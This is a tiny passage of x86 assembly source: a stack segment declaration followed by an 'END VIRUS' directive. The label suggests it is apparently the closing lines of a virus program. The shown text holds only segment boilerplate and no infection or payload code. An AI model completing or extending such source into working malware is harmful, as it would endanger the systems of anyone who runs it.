VSTACK SEGMENT PARA STACK
 	   db STACKSIZE dup (?)
VSTACK ENDS
	   END VIRUS 
